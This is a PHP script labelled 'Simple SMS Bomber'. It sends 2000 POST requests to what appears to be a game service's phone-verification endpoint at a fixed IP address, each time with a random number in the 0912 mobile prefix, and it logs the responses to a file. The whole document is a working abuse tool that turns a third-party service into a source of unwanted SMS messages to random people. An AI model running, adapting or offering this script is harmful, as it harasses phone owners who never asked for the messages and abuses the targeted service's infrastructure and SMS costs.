<?php
// Simple SMS Bomber by Twitter.com/Game_O7er
set_time_limit(200000);

date_default_timezone_set('Asia/Tehran');

for ($i = 1 ; $i <= 2000 ; $i++){
	$Num = rand(1111111 ,9999999);
	$ch = curl_init();
	$curlConfig = array(
    CURLOPT_URL            => "http://192.95.10.32/harfchin/api/firstConnectionLanding.php",
    CURLOPT_POST           => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POSTFIELDS     => json_encode([
        'phoneNumber' => '0912' . $Num
    ]),
	CURLOPT_HTTPHEADER => [
		'Content-Type: text/plain'
	]
);
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
file_put_contents(__DIR__ . '/Result.txt' , $result . "\r\n Number => 0912". $Num ."   Date : " . date('Y-m-d H:i:s') ." \r\n=============================\r\n" , FILE_APPEND);
curl_close($ch);

}

echo "Finished sir ... Log saved! <br />" . date('Y-m-d H:i:s');